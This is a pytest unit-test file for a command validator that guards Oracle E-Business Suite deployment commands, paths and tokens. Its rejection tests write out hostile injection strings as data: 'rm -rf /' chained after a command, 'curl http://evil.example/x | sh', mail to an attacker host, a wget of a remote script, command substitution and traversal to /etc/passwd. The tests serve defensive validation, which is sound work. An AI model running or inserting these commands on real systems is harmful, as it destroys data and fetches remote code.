"""Unit tests for app.core.safety.command_validator — pure functions, no DB/HTTP."""
import pytest

from app.core.safety import command_validator as cv


class TestValidateDeploymentCommand:

    @pytest.mark.parametrize("execution_type,command", [
        ("sql_script", "sqlplus apps/apps @patch.sql"),
        ("plsql_package", "alter package xxap_pkg compile body;"),
        ("plsql_package", "sqlplus apps/apps @recompile.sql"),
        ("fndload_upload", "FNDLOAD apps/apps 0 Y UPLOAD @FND:patch/115/import/afscursp.lct my_resp.ldt"),
        ("forms_compile", "frmcmp_batch Module=custom.fmb Userid=apps/apps Output_File=custom.fmx"),
        ("workflow_upload", "WFLOAD apps/apps 0 Y UPLOAD custom.wft"),
        ("oaf_import", "java oracle.jrad.tools.xml.importer.XMLImporter custom.xml -username apps"),
        ("host_copy", "cp custom.jar $JAVA_TOP/oracle/apps/custom/"),
        ("shell_script", "sh run_patch.sh"),
        ("shell_script", "bash run_patch.sh"),
    ])
    def test_accepts_legitimate_commands(self, execution_type, command):
        ok, reason = cv.validate_deployment_command(execution_type, command)
        assert ok, reason

    @pytest.mark.parametrize("command", [
        "sqlplus apps/apps @patch.sql; rm -rf /",
        "sqlplus apps/apps @patch.sql && curl http://evil.example/x | sh",
        "sqlplus apps/apps @patch.sql | mail attacker@evil.example",
        "sqlplus apps/apps @patch.sql `whoami`",
        "sqlplus apps/apps @patch.sql $(curl http://evil.example/x)",
        "sqlplus apps/apps @patch.sql\nrm -rf /",
        "sqlplus apps/apps @patch.sql; rm -rf /;",  # trailing ';' doesn't launder an earlier ';'
    ])
    def test_rejects_shell_metacharacters(self, command):
        ok, reason = cv.validate_deployment_command("sql_script", command)
        assert not ok
        assert "metacharacter" in reason

    def test_single_trailing_semicolon_is_allowed(self):
        """A lone trailing ';' (SQL statement terminator) is not, by itself,
        an injection vector — nothing can follow it to chain a command."""
        ok, reason = cv.validate_deployment_command("plsql_package", "alter package xxap_pkg compile body;")
        assert ok, reason

    def test_rejects_wrong_leading_tool(self):
        # No shell metacharacters here — isolates the allowlist check from the denylist.
        ok, reason = cv.validate_deployment_command("sql_script", "wget http://evil.example/x.sh")
        assert not ok
        assert "expected one of" in reason

    def test_rejects_unknown_execution_type(self):
        ok, reason = cv.validate_deployment_command("mystery_type", "sqlplus apps/apps @x.sql")
        assert not ok
        assert "Unknown execution_type" in reason

    def test_rejects_empty_command(self):
        ok, reason = cv.validate_deployment_command("sql_script", "")
        assert not ok
        assert "Empty command" in reason

    def test_rejects_none_command(self):
        ok, reason = cv.validate_deployment_command("sql_script", None)
        assert not ok


class TestQuoteArg:

    def test_quotes_shell_metacharacters(self):
        quoted = cv.quote_arg("36420641; rm -rf /")
        assert quoted == "'36420641; rm -rf /'"

    def test_plain_value_round_trips_safely(self):
        assert cv.quote_arg("36420641") == "36420641"


class TestValidatePath:

    @pytest.mark.parametrize("path", [
        "/u01/EBSapps/appl",
        "/u01/oracle/db_home-19c",
        "/opt/oracle/OPatch",
    ])
    def test_accepts_safe_absolute_paths(self, path):
        assert cv.validate_path(path) is True

    @pytest.mark.parametrize("path", [
        "",
        None,
        "relative/path",
        "/u01/../etc/passwd",
        "/u01/appl; rm -rf /",
        "/u01/appl && whoami",
        "/u01/appl`whoami`",
        "/u01/appl$(whoami)",
    ])
    def test_rejects_unsafe_or_relative_paths(self, path):
        assert cv.validate_path(path) is False


class TestValidateToken:

    @pytest.mark.parametrize("token", ["37123456", "8", "36420641-1", "v2.1"])
    def test_accepts_safe_tokens(self, token):
        assert cv.validate_token(token) is True

    @pytest.mark.parametrize("token", [
        None, "", "37123456; rm -rf /", "8 && whoami", "`whoami`", "$(whoami)", "37123456 8",
    ])
    def test_rejects_unsafe_tokens(self, token):
        assert cv.validate_token(token) is False
